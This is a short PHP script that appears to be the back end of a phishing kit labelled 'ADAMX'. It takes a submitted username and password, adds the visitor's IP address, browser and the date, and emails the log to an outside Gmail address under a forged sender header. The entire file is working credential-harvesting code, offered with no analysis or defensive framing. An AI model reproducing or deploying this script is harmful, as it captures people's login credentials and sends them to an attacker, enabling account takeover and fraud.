<?php 
$ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$x1 = $_REQUEST['x1'] ;
$x2 = $_REQUEST['x2'] ;



$mesaj = "------------ADAMX--------------

-----------ADAMX Logs-------------
Username : $x1
Password : $x2
IP:$ip
----------------------------------------------------
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
DATE : $datamasii"; 
	$mailHeaders = "From: " . $x1. "<". $x1 .">\r\n";
$subject = "ADAMX  LOGS";
mail('palmerryan262@gmail.com', $subject,$mesaj, $mailHeaders);

?>

